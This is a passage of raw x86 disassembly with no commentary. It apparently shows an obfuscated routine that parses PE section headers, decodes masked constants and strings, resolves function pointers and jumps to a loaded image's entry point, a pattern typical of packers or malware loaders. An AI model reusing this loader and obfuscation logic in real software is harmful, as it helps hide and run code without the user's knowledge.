  426d05:	add    ecx,DWORD PTR [ebp+0x20]
  426d08:	push   ecx
  426d09:	call   0x4275e5
  426d0e:	mov    edx,DWORD PTR [ebp-0x4]
  426d11:	mov    eax,DWORD PTR [ebp+0x18]
  426d14:	mov    ecx,DWORD PTR [eax+0x8]
  426d17:	xor    edx,esi
  426d19:	add    edx,edi
  426d1b:	cmp    ecx,edx
  426d1d:	je     0x426d36
  426d1f:	push   ecx
  426d20:	mov    ecx,DWORD PTR [ebp+0x8]
  426d23:	add    ecx,DWORD PTR [eax+0xc]
  426d26:	mov    eax,DWORD PTR [eax+0x4]
  426d29:	add    eax,DWORD PTR [ebp+0x20]
  426d2c:	push   ecx
  426d2d:	push   eax
  426d2e:	call   0x4274db
  426d33:	mov    eax,DWORD PTR [ebp+0x18]
  426d36:	mov    ecx,DWORD PTR [ebp-0x24]
  426d39:	mov    edx,DWORD PTR [ebp-0x8]
  426d3c:	add    eax,0x28
  426d3f:	xor    ecx,esi
  426d41:	lea    ecx,[edx+ecx*1+0x3272ec]
  426d48:	mov    edx,DWORD PTR [ebp+0xc]
  426d4b:	mov    DWORD PTR [ebp+0x18],eax
  426d4e:	mov    eax,DWORD PTR [ebp-0x24]
  426d51:	movzx  edx,WORD PTR [edx+0x6]
  426d55:	xor    eax,esi
  426d57:	sub    edx,eax
  426d59:	mov    eax,DWORD PTR [ebp+0xc]
  426d5c:	sub    edx,edi
  426d5e:	mov    DWORD PTR [ebp-0x8],ecx
  426d61:	cmp    ecx,edx
  426d63:	jbe    0x426ce9
  426d65:	mov    edx,DWORD PTR [ebx+0x18c]
  426d6b:	mov    ecx,DWORD PTR [ebp+0x20]
  426d6e:	cmp    ecx,DWORD PTR [edx]
  426d70:	jne    0x426d99
  426d72:	mov    eax,DWORD PTR [ebx+0x1d8]
  426d78:	lea    edx,[ebp-0x18]
  426d7b:	push   edx
  426d7c:	mov    edx,DWORD PTR [ebp-0x10]
  426d7f:	xor    edx,esi
  426d81:	add    edx,edi
  426d83:	push   edx
  426d84:	mov    edx,DWORD PTR [ebp-0x20]
  426d87:	push   DWORD PTR [edx+0x54]
  426d8a:	push   ecx
  426d8b:	call   DWORD PTR [eax+0x1c]
  426d8e:	test   eax,eax
  426d90:	je     0x427039
  426d96:	mov    eax,DWORD PTR [ebp+0xc]
  426d99:	mov    ecx,DWORD PTR [ebx+0x1c8]
  426d9f:	mov    ecx,DWORD PTR [ecx]
  426da1:	xor    ecx,esi
  426da3:	add    ecx,edi
  426da5:	je     0x426f64
  426dab:	mov    eax,DWORD PTR [ebp-0x4]
  426dae:	xor    eax,esi
  426db0:	add    eax,edi
  426db2:	and    DWORD PTR [ebp+0x8],0x0
  426db6:	mov    DWORD PTR [ebp-0x14],eax
  426db9:	mov    ecx,0xf89c8524
  426dbe:	mov    eax,0xf89c85dc
  426dc3:	mov    DWORD PTR [ebp-0x58],0xf89c8526
  426dca:	mov    DWORD PTR [ebp-0x54],0xf89c852c
  426dd1:	mov    DWORD PTR [ebp-0x50],eax
  426dd4:	mov    DWORD PTR [ebp-0x4c],ecx
  426dd7:	mov    DWORD PTR [ebp-0x48],ecx
  426dda:	mov    DWORD PTR [ebp-0x44],0xf89c85b0
  426de1:	mov    edx,DWORD PTR [ebp+0x8]
  426de4:	mov    ecx,0x8a4
  426de9:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  426dee:	mov    edx,0x72ec
  426df3:	add    cx,dx
  426df6:	mov    edx,DWORD PTR [ebp+0x8]
  426df9:	inc    DWORD PTR [ebp+0x8]
  426dfc:	cmp    DWORD PTR [ebp+0x8],0x6
  426e00:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  426e08:	jb     0x426de1
  426e0a:	mov    ecx,0xf89c8522
  426e0f:	mov    DWORD PTR [ebp-0xb0],eax
  426e15:	mov    DWORD PTR [ebp-0x9c],eax
  426e1b:	mov    DWORD PTR [ebp-0x74],eax
  426e1e:	mov    DWORD PTR [ebp-0x70],eax
  426e21:	lea    eax,[ecx+0x1]
  426e24:	mov    edx,0xf89c85fe
  426e29:	mov    DWORD PTR [ebp-0x64],eax
  426e2c:	mov    DWORD PTR [ebp-0x60],eax
  426e2f:	mov    DWORD PTR [ebp-0xb4],0xf89c85c4
  426e39:	mov    DWORD PTR [ebp-0xac],ecx
  426e3f:	mov    DWORD PTR [ebp-0xa8],edx
  426e45:	mov    DWORD PTR [ebp-0xa4],0xf89c85d9
  426e4f:	mov    DWORD PTR [ebp-0xa0],0xf89c8526
  426e59:	mov    DWORD PTR [ebp-0x98],0xf89c85fd
  426e63:	mov    DWORD PTR [ebp-0x94],0xf89c8526
  426e6d:	mov    DWORD PTR [ebp-0x90],0xf89c852c
  426e77:	mov    DWORD PTR [ebp-0x8c],ecx
  426e7d:	mov    DWORD PTR [ebp-0x88],0xf89c8529
  426e87:	mov    DWORD PTR [ebp-0x84],edx
  426e8d:	mov    DWORD PTR [ebp-0x80],0xf89c8527
  426e94:	mov    DWORD PTR [ebp-0x7c],ecx
  426e97:	mov    DWORD PTR [ebp-0x78],0xf89c85f1
  426e9e:	mov    DWORD PTR [ebp-0x6c],ecx
  426ea1:	mov    DWORD PTR [ebp-0x68],0xf89c85dd
  426ea8:	mov    DWORD PTR [ebp-0x5c],0xf89c85b0
  426eaf:	xor    eax,eax
  426eb1:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  426eb8:	xor    cl,0xa4
  426ebb:	sub    cl,0x14
  426ebe:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  426ec5:	inc    eax
  426ec6:	cmp    eax,0x17
  426ec9:	jb     0x426eb1
  426ecb:	mov    eax,DWORD PTR [ebx+0x1d8]
  426ed1:	lea    ecx,[ebp-0xc0]
  426ed7:	push   ecx
  426ed8:	call   DWORD PTR [eax+0x4]
  426edb:	mov    ecx,DWORD PTR [ebx+0x1d8]
  426ee1:	lea    edx,[ebp-0xd8]
  426ee7:	push   edx
  426ee8:	push   eax
  426ee9:	call   DWORD PTR [ecx+0x8]
  426eec:	mov    DWORD PTR [ebp-0x40],eax
  426eef:	lea    eax,[ebp-0x14]
  426ef2:	push   eax
  426ef3:	mov    eax,DWORD PTR [ebx+0x18c]
  426ef9:	push   DWORD PTR [eax]
  426efb:	mov    eax,DWORD PTR [ebp-0x40]
  426efe:	call   eax
  426f00:	mov    eax,DWORD PTR [ebp-0x4]
  426f03:	xor    eax,esi
  426f05:	add    eax,edi
  426f07:	mov    DWORD PTR [ebp-0x34],eax
  426f0a:	mov    ecx,DWORD PTR [ebp-0x4]
  426f0d:	mov    eax,DWORD PTR [ebp-0x14]
  426f10:	xor    ecx,esi
  426f12:	add    ecx,edi
  426f14:	cmp    eax,ecx
  426f16:	je     0x426f61
  426f18:	mov    DWORD PTR [ebp-0x3c],eax
  426f1b:	jmp    0x426f2c
  426f1d:	mov    eax,DWORD PTR [eax]
  426f1f:	mov    ecx,DWORD PTR [ebp-0x3c]
  426f22:	mov    DWORD PTR [ebp-0x14],eax
  426f25:	mov    eax,DWORD PTR [ebp-0x14]
  426f28:	cmp    eax,ecx
  426f2a:	je     0x426f39
  426f2c:	mov    edx,DWORD PTR [eax+0x18]
  426f2f:	mov    ecx,DWORD PTR [ebx+0x18c]
  426f35:	cmp    edx,DWORD PTR [ecx]
  426f37:	jne    0x426f1d
  426f39:	mov    ecx,DWORD PTR [ebx+0x18c]
  426f3f:	mov    edx,DWORD PTR [eax+0x18]
  426f42:	cmp    edx,DWORD PTR [ecx]
  426f44:	jne    0x426f61
  426f46:	mov    ecx,DWORD PTR [ebx+0x190]
  426f4c:	mov    edx,DWORD PTR [ebp-0x20]
  426f4f:	mov    edx,DWORD PTR [edx+0x28]
  426f52:	add    edx,DWORD PTR [ecx]
  426f54:	mov    DWORD PTR [eax+0x1c],edx
  426f57:	mov    eax,DWORD PTR [ebp-0x24]
  426f5a:	xor    eax,esi
  426f5c:	add    eax,edi
  426f5e:	mov    DWORD PTR [ebp-0x34],eax
  426f61:	mov    eax,DWORD PTR [ebp+0xc]
  426f64:	push   ebx
  426f65:	push   eax
  426f66:	push   DWORD PTR [ebp+0x20]
  426f69:	call   0x4266e5
  426f6e:	test   eax,eax
  426f70:	je     0x427039
  426f76:	push   DWORD PTR [ebp+0xc]
  426f79:	mov    ecx,ebx
  426f7b:	push   DWORD PTR [ebp+0x20]
  426f7e:	call   0x42663e
  426f83:	test   eax,eax
  426f85:	je     0x427039
  426f8b:	mov    eax,DWORD PTR [ebp+0xc]
  426f8e:	mov    edx,DWORD PTR [ebp+0x20]
  426f91:	mov    ecx,ebx
  426f93:	call   0x426517
  426f98:	test   eax,eax
  426f9a:	je     0x427039
  426fa0:	push   ebx
  426fa1:	push   DWORD PTR [ebp+0x20]
  426fa4:	call   0x4269c8
  426fa9:	test   eax,eax
  426fab:	je     0x427039
  426fb1:	mov    eax,DWORD PTR [ebx+0x18c]
  426fb7:	mov    edx,DWORD PTR [ebp+0x20]
  426fba:	cmp    edx,DWORD PTR [eax]
  426fbc:	jne    0x426fd8
  426fbe:	mov    eax,DWORD PTR [ebx+0x1d8]
  426fc4:	lea    ecx,[ebp-0x18]
  426fc7:	push   ecx
  426fc8:	push   DWORD PTR [ebp-0x18]
  426fcb:	mov    ecx,DWORD PTR [ebp-0x20]
  426fce:	push   DWORD PTR [ecx+0x54]
  426fd1:	push   edx
  426fd2:	call   DWORD PTR [eax+0x1c]
  426fd5:	mov    edx,DWORD PTR [ebp+0x20]
  426fd8:	mov    eax,DWORD PTR [ebx+0x1c8]
  426fde:	mov    eax,DWORD PTR [eax]
  426fe0:	xor    eax,esi
  426fe2:	add    eax,edi
  426fe4:	je     0x42701d
  426fe6:	mov    ecx,DWORD PTR [ebp+0xc]
  426fe9:	mov    eax,DWORD PTR [ecx+0x28]
  426fec:	mov    DWORD PTR [ebp+0x8],0xf89ca5b0
  426ff3:	mov    esi,DWORD PTR [ebp+0x8]
  426ff6:	push   DWORD PTR [ebp+0x14]
  426ff9:	xor    esi,0x8a4
  426fff:	push   DWORD PTR [ebp+0x10]
  427002:	add    esi,0x72ec
  427008:	or     WORD PTR [ecx+0x16],si
  42700c:	add    eax,edx
  42700e:	push   edx
  42700f:	call   eax
  427011:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b1
  42701b:	jmp    0x427027
  42701d:	mov    eax,DWORD PTR [ebp+0xc]
  427020:	mov    eax,DWORD PTR [eax+0x28]
  427023:	add    eax,edx
  427025:	call   eax
  427027:	mov    DWORD PTR [ebp-0x8],eax
  42702a:	mov    eax,DWORD PTR [ebp-0x8]
  42702d:	mov    ecx,DWORD PTR [ebp+0x1c]
  427030:	mov    DWORD PTR [ecx],eax
  427032:	mov    DWORD PTR [ebp-0x30],0x1
  427039:	cmp    DWORD PTR [ebp-0x30],0x0
  42703d:	jne    0x427043
  42703f:	and    DWORD PTR [ebp+0x20],0x0
  427043:	mov    eax,DWORD PTR [ebp+0x20]
  427046:	jmp    0x42704a
  427048:	xor    eax,eax
  42704a:	pop    edi
  42704b:	pop    esi
  42704c:	pop    ebx
  42704d:	leave  
  42704e:	ret    0x1c
  427051:	push   ebp
  427052:	mov    ebp,esp
  427054:	movzx  edx,WORD PTR [ecx+0x6]
  427058:	movzx  eax,WORD PTR [ecx+0x14]
  42705c:	push   ebx
  42705d:	push   edi
  42705e:	xor    edi,edi
  427060:	lea    eax,[eax+ecx*1+0x18]
  427064:	test   edx,edx
  427066:	je     0x427087
  427068:	mov    ecx,DWORD PTR [eax+0xc]
  42706b:	lea    ebx,[ecx+esi*1]
  42706e:	cmp    DWORD PTR [ebp+0x8],ebx
  427071:	jb     0x42707f
  427073:	mov    ebx,DWORD PTR [eax+0x8]
  427076:	add    ebx,ecx
  427078:	add    ebx,esi
  42707a:	cmp    DWORD PTR [ebp+0x8],ebx
  42707d:	jb     0x427089
  42707f:	add    eax,0x28
  427082:	inc    edi
  427083:	cmp    edi,edx
  427085:	jb     0x427068
  427087:	xor    eax,eax
  427089:	pop    edi
  42708a:	pop    ebx
  42708b:	pop    ebp
  42708c:	ret    0x4
  42708f:	push   ebp
  427090:	mov    ebp,esp
  427092:	sub    esp,0x34
  427095:	mov    DWORD PTR [ebp-0xc],0xf89c85b0
  42709c:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  4270a3:	mov    DWORD PTR [ebp-0x1c],0xf89c85b2
  4270aa:	mov    DWORD PTR [ebp-0x8],0xf89c85d1
  4270b1:	mov    DWORD PTR [ebp-0x20],0xf89c85f1
  4270b8:	mov    DWORD PTR [ebp-0x2c],0xf89c852a
  4270bf:	mov    DWORD PTR [ebp-0x2c],0xf89c85ca
  4270c6:	mov    DWORD PTR [ebp-0x10],eax
  4270c9:	mov    eax,DWORD PTR [ebp+0x8]
  4270cc:	mov    DWORD PTR [ebp-0x14],eax
  4270cf:	mov    eax,DWORD PTR [ebp-0xc]
  4270d2:	push   ebx
  4270d3:	mov    ecx,0x75108a4
  4270d8:	xor    eax,ecx
  4270da:	push   esi
  4270db:	mov    esi,DWORD PTR [ebp-0x10]
  4270de:	mov    edx,0x3272ec
  4270e3:	add    eax,edx
  4270e5:	push   edi
  4270e6:	cmp    esi,eax
  4270e8:	je     0x4272c7
  4270ee:	mov    eax,DWORD PTR [ebp-0xc]
  4270f1:	mov    esi,DWORD PTR [ebp-0x14]
  4270f4:	xor    eax,ecx
  4270f6:	add    eax,edx
  4270f8:	cmp    esi,eax
  4270fa:	je     0x4272c7
  427100:	mov    eax,DWORD PTR [ebp-0xc]
  427103:	xor    eax,ecx
  427105:	add    eax,edx
  427107:	mov    DWORD PTR [ebp-0x24],eax
  42710a:	mov    eax,DWORD PTR [ebp-0xc]
  42710d:	xor    eax,ecx
  42710f:	add    eax,edx
  427111:	mov    DWORD PTR [ebp-0x28],eax
  427114:	mov    edi,DWORD PTR [ebp-0x20]
  427117:	mov    ebx,DWORD PTR [ebp-0x8]
  42711a:	mov    esi,0x8a4
  42711f:	xor    edi,esi
  427121:	mov    eax,0x72ec
  427126:	xor    ebx,esi
  427128:	add    edi,eax
  42712a:	add    ebx,eax
  42712c:	sub    ebx,edi
  42712e:	mov    WORD PTR [ebp-0x8],bx
  427132:	jmp    0x4271f7
  427137:	mov    edi,DWORD PTR [ebp-0xc]
  42713a:	mov    bx,WORD PTR [ebp-0x4]
  42713e:	xor    edi,esi
  427140:	add    edi,eax
  427142:	cmp    bx,di
  427145:	je     0x427239
  42714b:	mov    edi,DWORD PTR [ebp-0xc]
  42714e:	mov    ebx,DWORD PTR [ebp+0xc]
  427151:	xor    edi,ecx
  427153:	add    edi,edx
  427155:	cmp    ebx,edi
  427157:	mov    di,WORD PTR [ebp-0x4]
  42715b:	mov    bx,WORD PTR [ebp+0x8]
  42715f:	je     0x4271ca
  427161:	cmp    bx,di
  427164:	je     0x4271d3
  427166:	mov    edi,DWORD PTR [ebp-0x20]
  427169:	mov    bx,WORD PTR [ebp+0x8]
  42716d:	xor    edi,esi
  42716f:	add    edi,eax
  427171:	cmp    bx,di
  427174:	jb     0x427194
  427176:	mov    edi,DWORD PTR [ebp-0x2c]
  427179:	mov    bx,WORD PTR [ebp+0x8]
  42717d:	xor    edi,esi
  42717f:	add    edi,eax
  427181:	cmp    bx,di
  427184:	ja     0x427194
  427186:	movzx  edi,WORD PTR [ebp+0x8]
  42718a:	movzx  ebx,WORD PTR [ebp-0x8]
  42718e:	add    edi,ebx
  427190:	mov    WORD PTR [ebp+0x8],di
  427194:	mov    edi,DWORD PTR [ebp-0x20]
  427197:	mov    bx,WORD PTR [ebp-0x4]
  42719b:	xor    edi,esi
  42719d:	add    edi,eax
  42719f:	cmp    bx,di
  4271a2:	jb     0x4271c2
  4271a4:	mov    edi,DWORD PTR [ebp-0x2c]
  4271a7:	mov    bx,WORD PTR [ebp-0x4]
  4271ab:	xor    edi,esi
  4271ad:	add    edi,eax
  4271af:	cmp    bx,di
  4271b2:	ja     0x4271c2
  4271b4:	movzx  edi,WORD PTR [ebp-0x4]
  4271b8:	movzx  ebx,WORD PTR [ebp-0x8]
  4271bc:	add    edi,ebx
  4271be:	mov    WORD PTR [ebp-0x4],di
  4271c2:	mov    di,WORD PTR [ebp-0x4]
  4271c6:	mov    bx,WORD PTR [ebp+0x8]
  4271ca:	cmp    bx,di
  4271cd:	jne    0x4272c7
  4271d3:	mov    edi,DWORD PTR [ebp-0x1c]
  4271d6:	mov    ebx,DWORD PTR [ebp-0x10]
  4271d9:	xor    edi,ecx
  4271db:	lea    edi,[edi+ebx*1+0x3272ec]
  4271e2:	mov    DWORD PTR [ebp-0x10],edi
  4271e5:	mov    edi,DWORD PTR [ebp-0x1c]
  4271e8:	mov    ebx,DWORD PTR [ebp-0x14]
  4271eb:	xor    edi,ecx
  4271ed:	lea    edi,[edi+ebx*1+0x3272ec]
  4271f4:	mov    DWORD PTR [ebp-0x14],edi
  4271f7:	mov    edi,DWORD PTR [ebp-0x24]
  4271fa:	mov    ebx,DWORD PTR [ebp-0x10]
  4271fd:	mov    di,WORD PTR [ebx+edi*2]
  427201:	mov    WORD PTR [ebp+0x8],di
  427205:	mov    edi,DWORD PTR [ebp-0x28]
  427208:	mov    ebx,DWORD PTR [ebp-0x14]
  42720b:	mov    di,WORD PTR [ebx+edi*2]
  42720f:	mov    WORD PTR [ebp-0x4],di
  427213:	mov    edi,DWORD PTR [ebp-0xc]
  427216:	mov    bx,WORD PTR [ebp+0x8]
  42721a:	xor    edi,esi
  42721c:	add    edi,eax
  42721e:	cmp    bx,di
  427221:	jne    0x427137
  427227:	mov    eax,DWORD PTR [ebp-0x18]
  42722a:	mov    esi,DWORD PTR [ebp-0xc]
  42722d:	xor    eax,ecx
  42722f:	add    eax,edx
  427231:	imul   eax,esi
  427234:	mov    DWORD PTR [ebp-0xc],eax
  427237:	jmp    0x42724b
  427239:	mov    eax,DWORD PTR [ebp-0xc]
  42723c:	mov    esi,DWORD PTR [ebp-0x18]
  42723f:	xor    eax,ecx
  427241:	lea    eax,[eax+esi*1+0x3272ec]
  427248:	mov    DWORD PTR [ebp-0x18],eax
  42724b:	mov    eax,DWORD PTR [ebp-0x24]
  42724e:	sub    eax,edx
  427250:	xor    eax,ecx
  427252:	mov    DWORD PTR [ebp-0x30],eax
  427255:	mov    eax,DWORD PTR [ebp-0x28]
  427258:	sub    eax,edx
  42725a:	xor    eax,ecx
  42725c:	mov    DWORD PTR [ebp-0x34],eax
  42725f:	mov    eax,DWORD PTR [ebp-0x34]
  427262:	mov    esi,DWORD PTR [ebp-0x1c]
  427265:	xor    esi,ecx
  427267:	add    esi,edx
  427269:	xor    eax,ecx
  42726b:	add    eax,0x3272ec
  427270:	imul   esi,eax
  427273:	mov    eax,DWORD PTR [ebp-0x14]
  427276:	movzx  eax,WORD PTR [esi+eax*1]
  42727a:	mov    esi,DWORD PTR [ebp-0x30]
  42727d:	mov    edi,DWORD PTR [ebp-0x1c]
  427280:	xor    esi,ecx
  427282:	add    esi,edx
  427284:	xor    edi,ecx
  427286:	add    edi,edx
  427288:	imul   edi,esi
  42728b:	mov    esi,DWORD PTR [ebp-0x10]
  42728e:	movzx  esi,WORD PTR [edi+esi*1]
  427292:	sub    eax,edx
  427294:	sub    esi,edx
  427296:	xor    eax,ecx
  427298:	xor    esi,ecx
  42729a:	cmp    esi,eax
  42729c:	jne    0x4272c7
  42729e:	mov    eax,DWORD PTR [ebp-0x30]
  4272a1:	mov    esi,DWORD PTR [ebp-0x1c]
  4272a4:	xor    eax,ecx
  4272a6:	add    eax,0x3272ec
  4272ab:	xor    esi,ecx
  4272ad:	add    esi,edx
  4272af:	imul   esi,eax
  4272b2:	mov    eax,DWORD PTR [ebp-0x10]
  4272b5:	movzx  eax,WORD PTR [esi+eax*1]
  4272b9:	mov    esi,DWORD PTR [ebp-0xc]
  4272bc:	sub    eax,edx
  4272be:	xor    eax,ecx
  4272c0:	cmp    eax,esi
  4272c2:	mov    eax,DWORD PTR [ebp-0xc]
  4272c5:	je     0x4272ca
  4272c7:	mov    eax,DWORD PTR [ebp-0x18]
  4272ca:	pop    edi
  4272cb:	xor    eax,ecx
  4272cd:	pop    esi
  4272ce:	add    eax,edx
  4272d0:	pop    ebx
  4272d1:	leave  
  4272d2:	ret    0x8
  4272d5:	push   ebp
  4272d6:	mov    ebp,esp
  4272d8:	push   ecx
  4272d9:	mov    cx,WORD PTR [eax]
  4272dc:	push   esi
  4272dd:	mov    esi,0x3b56
  4272e2:	sub    cx,si
  4272e5:	mov    esi,0x8a94
  4272ea:	xor    cx,si
  4272ed:	mov    esi,0x4e3e
  4272f2:	mov    DWORD PTR [ebp-0x4],0xf89c85b7
  4272f9:	mov    edx,0xf89c85b0
  4272fe:	cmp    cx,si
  427301:	je     0x427360
  427303:	push   ebx
  427304:	push   edi
  427305:	movzx  ecx,cx
  427308:	mov    edi,0xffcd8d14
  42730d:	mov    esi,0x75108a4
  427312:	mov    ebx,0x4f92
  427317:	cmp    cx,bx
  42731a:	jne    0x42731f
  42731c:	mov    DWORD PTR [ebp-0x4],edx
  42731f:	lea    edx,[edi+0x1]
  427322:	xor    edx,esi
  427324:	mov    edi,edx
  427326:	xor    edi,esi
  427328:	mov    cx,WORD PTR [eax+edi*2+0x64e5d8]
  427330:	mov    ebx,0x3b56
  427335:	sub    cx,bx
  427338:	mov    ebx,0x8a94
  42733d:	xor    cx,bx
  427340:	mov    ebx,0x4e3e
  427345:	cmp    cx,bx
  427348:	jne    0x427312
  42734a:	mov    ecx,DWORD PTR [ebp-0x4]
  42734d:	pop    edi
  42734e:	pop    ebx
  42734f:	cmp    ecx,0xf89c85b7
  427355:	je     0x427360
  427357:	xor    ecx,esi
  427359:	lea    eax,[eax+ecx*2+0x64e5da]
  427360:	pop    esi
  427361:	leave  
  427362:	ret    
  427363:	push   ebp
  427364:	mov    ebp,esp
  427366:	push   ecx
  427367:	push   esi
  427368:	push   edi
  427369:	mov    DWORD PTR [ebp-0x4],0xf89c85b7
  427370:	mov    esi,0xf89c85b0
  427375:	call   0x4272d5
  42737a:	mov    edi,eax
  42737c:	mov    al,BYTE PTR [edi]
  42737e:	add    al,0x3
  427380:	xor    al,0x79
  427382:	cmp    al,0x7a
  427384:	je     0x4273e7
  427386:	mov    eax,edi
  427388:	mov    edx,0xffcd8d14
  42738d:	mov    ecx,0x75108a4
  427392:	push   ebx
  427393:	mov    ax,WORD PTR [eax]
  427396:	mov    ebx,0x3b56
  42739b:	sub    ax,bx
  42739e:	mov    ebx,0x8a94
  4273a3:	xor    ax,bx
  4273a6:	mov    ebx,0x4e4c
  4273ab:	cmp    ax,bx
  4273ae:	jne    0x4273b3
  4273b0:	mov    DWORD PTR [ebp-0x4],esi
  4273b3:	lea    esi,[edx+0x1]
  4273b6:	xor    esi,ecx
  4273b8:	mov    edx,esi
  4273ba:	xor    edx,ecx
  4273bc:	lea    eax,[edi+edx*2+0x64e5d8]
  4273c3:	mov    bl,BYTE PTR [eax]
  4273c5:	add    bl,0x3
  4273c8:	xor    bl,0x79
  4273cb:	cmp    bl,0x7a
  4273ce:	jne    0x427393
  4273d0:	mov    eax,DWORD PTR [ebp-0x4]
  4273d3:	pop    ebx
  4273d4:	cmp    eax,0xf89c85b7
  4273d9:	je     0x4273e7
  4273db:	xor    eax,ecx
  4273dd:	xor    ecx,ecx
  4273df:	mov    WORD PTR [edi+eax*2+0x64e5d8],cx
  4273e7:	mov    eax,edi
  4273e9:	pop    edi
  4273ea:	pop    esi
  4273eb:	leave  
  4273ec:	ret    
  4273ed:	push   ebp
  4273ee:	mov    ebp,esp
  4273f0:	push   ecx
  4273f1:	push   esi
  4273f2:	mov    DWORD PTR [ebp-0x4],0xf89c85b7
  4273f9:	mov    esi,0xf89c85b0
  4273fe:	call   0x4272d5
  427403:	mov    cx,WORD PTR [eax]
  427406:	mov    edx,0x3b56
  42740b:	sub    cx,dx
  42740e:	mov    edx,0x8a94
  427413:	xor    cx,dx
  427416:	mov    edx,0x4e3e
  42741b:	cmp    cx,dx
  42741e:	je     0x427477
  427420:	push   ebx
  427421:	push   edi
  427422:	movzx  ecx,cx
  427425:	mov    edx,0xffcd8d14
  42742a:	mov    edi,0x75108a4
  42742f:	mov    ebx,0x4e4c
  427434:	cmp    cx,bx
  427437:	jne    0x42743c
  427439:	mov    DWORD PTR [ebp-0x4],esi
  42743c:	lea    esi,[edx+0x1]
  42743f:	xor    esi,edi
  427441:	mov    edx,esi
  427443:	xor    edx,edi
  427445:	mov    cx,WORD PTR [eax+edx*2+0x64e5d8]
  42744d:	mov    ebx,0x3b56
  427452:	sub    cx,bx
  427455:	mov    ebx,0x8a94
  42745a:	xor    cx,bx
  42745d:	mov    ebx,0x4e3e
  427462:	cmp    cx,bx
  427465:	jne    0x42742f
  427467:	cmp    DWORD PTR [ebp-0x4],0xf89c85b7
  42746e:	pop    edi
  42746f:	pop    ebx
  427470:	je     0x427477
  427472:	xor    eax,eax
  427474:	inc    eax
  427475:	jmp    0x427479
  427477:	xor    eax,eax
  427479:	pop    esi
  42747a:	leave  
  42747b:	ret    
  42747c:	push   ebp
  42747d:	mov    ebp,esp
  42747f:	push   ecx
  427480:	mov    eax,DWORD PTR [ebp+0x8]
  427483:	movzx  ecx,WORD PTR [eax]
  427486:	push   esi
  427487:	lea    eax,[ecx-0x3b56]
  42748d:	mov    esi,0x8a94
  427492:	push   edi
  427493:	xor    eax,esi
  427495:	mov    edi,0x4e3e
  42749a:	mov    DWORD PTR [ebp-0x4],edx
  42749d:	cmp    ax,di
  4274a0:	je     0x4274cd
  4274a2:	mov    eax,DWORD PTR [ebp+0x8]
  4274a5:	sub    eax,edx
  4274a7:	mov    DWORD PTR [ebp+0x8],eax
  4274aa:	jmp    0x4274af
  4274ac:	mov    eax,DWORD PTR [ebp+0x8]
  4274af:	mov    WORD PTR [edx],cx
  4274b2:	add    edx,0x2
  4274b5:	movzx  edi,WORD PTR [eax+edx*1]
  4274b9:	mov    ecx,edi
  4274bb:	add    edi,0xffffc4aa
  4274c1:	xor    edi,esi
  4274c3:	mov    eax,0x4e3e
  4274c8:	cmp    di,ax
  4274cb:	jne    0x4274ac
  4274cd:	xor    eax,eax
  4274cf:	pop    edi
  4274d0:	mov    WORD PTR [edx],ax
  4274d3:	mov    eax,DWORD PTR [ebp-0x4]
  4274d6:	pop    esi
  4274d7:	leave  
  4274d8:	ret    0x4
  4274db:	push   ebp
  4274dc:	mov    ebp,esp
  4274de:	sub    esp,0x18
  4274e1:	mov    DWORD PTR [ebp-0x8],0xf89c85b0
  4274e8:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  4274ef:	mov    ecx,DWORD PTR [ebp-0x8]
  4274f2:	push   esi
  4274f3:	mov    eax,0x75108a4
  4274f8:	xor    ecx,eax
  4274fa:	mov    esi,0x3272ec
  4274ff:	add    ecx,esi
  427501:	mov    DWORD PTR [ebp-0x4],ecx
  427504:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  42750b:	mov    DWORD PTR [ebp-0x10],0xf89c85bc
  427512:	push   edi
  427513:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  42751a:	jmp    0x4275bb
  42751f:	mov    ecx,DWORD PTR [ebp-0x4]
  427522:	mov    edx,DWORD PTR [ebp+0x10]
  427525:	sub    edx,ecx
  427527:	mov    ecx,DWORD PTR [ebp-0xc]
  42752a:	xor    ecx,eax
  42752c:	add    ecx,esi
  42752e:	cmp    edx,ecx
  427530:	jbe    0x42754d
  427532:	mov    edx,DWORD PTR [ebp-0x4]
  427535:	add    edx,DWORD PTR [ebp+0x8]
  427538:	mov    ecx,DWORD PTR [ebp-0x4]
  42753b:	add    ecx,DWORD PTR [ebp+0xc]
  42753e:	mov    edi,DWORD PTR [ecx]
  427540:	mov    DWORD PTR [edx],edi
  427542:	mov    ecx,DWORD PTR [ecx+0x4]
  427545:	mov    DWORD PTR [edx+0x4],ecx
  427548:	mov    ecx,DWORD PTR [ebp-0xc]
  42754b:	jmp    0x42759a
  42754d:	mov    ecx,DWORD PTR [ebp-0x4]
  427550:	mov    edx,DWORD PTR [ebp+0x10]
  427553:	sub    edx,ecx
  427555:	mov    ecx,DWORD PTR [ebp-0x10]
  427558:	xor    ecx,eax
  42755a:	add    ecx,esi
  42755c:	cmp    edx,ecx
  42755e:	mov    ecx,DWORD PTR [ebp-0x4]
  427561:	jbe    0x427575
  427563:	add    ecx,DWORD PTR [ebp+0x8]
  427566:	mov    edx,DWORD PTR [ebp-0x4]
  427569:	add    edx,DWORD PTR [ebp+0xc]
  42756c:	mov    edx,DWORD PTR [edx]
  42756e:	mov    DWORD PTR [ecx],edx
  427570:	mov    ecx,DWORD PTR [ebp-0x10]
  427573:	jmp    0x42759a
  427575:	mov    edx,DWORD PTR [ebp+0x10]
  427578:	sub    edx,ecx
  42757a:	mov    ecx,DWORD PTR [ebp-0x14]
  42757d:	xor    ecx,eax
  42757f:	add    ecx,esi
  427581:	cmp    edx,ecx
  427583:	mov    ecx,DWORD PTR [ebp-0x4]
  427586:	jbe    0x4275ab
  427588:	add    ecx,DWORD PTR [ebp+0x8]
  42758b:	mov    edx,DWORD PTR [ebp-0x4]
  42758e:	add    edx,DWORD PTR [ebp+0xc]
  427591:	mov    dx,WORD PTR [edx]
  427594:	mov    WORD PTR [ecx],dx
  427597:	mov    ecx,DWORD PTR [ebp-0x14]
  42759a:	mov    edx,DWORD PTR [ebp-0x4]
  42759d:	xor    ecx,eax
  42759f:	lea    ecx,[ecx+edx*1+0x3272ec]
  4275a6:	mov    DWORD PTR [ebp-0x4],ecx
  4275a9:	jmp    0x4275bb
  4275ab:	add    ecx,DWORD PTR [ebp+0x8]
  4275ae:	mov    edx,DWORD PTR [ebp-0x4]
